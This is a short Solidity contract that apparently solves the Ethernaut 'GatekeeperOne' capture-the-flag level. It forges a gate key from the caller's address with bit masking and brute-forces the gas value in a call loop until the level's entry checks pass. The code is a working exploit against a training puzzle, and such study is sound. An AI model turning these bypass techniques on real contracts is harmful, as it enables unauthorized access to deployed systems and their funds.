// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import {GatekeeperOne} from "../levels/GatekeeperOne.sol";
import {console} from "forge-std/console.sol";

contract GatekeeperOneAttack {
    constructor(){

    }
    function attack(GatekeeperOne gatekeeperOne) external{
        bytes8 _gateKey = bytes8(uint64(uint16(uint160(address(msg.sender)))) | (uint64(1) << 33));
        bytes memory data = abi.encodeCall(GatekeeperOne.enter,(_gateKey));
        for(uint256 i = 0; i < type(uint256).max; i ++){
            (bool success, ) = address(gatekeeperOne).call{gas: 8191 * 10 + i}(data);
            if (success){
                console.logUint(i);
                break;
            }
        }
    }
}
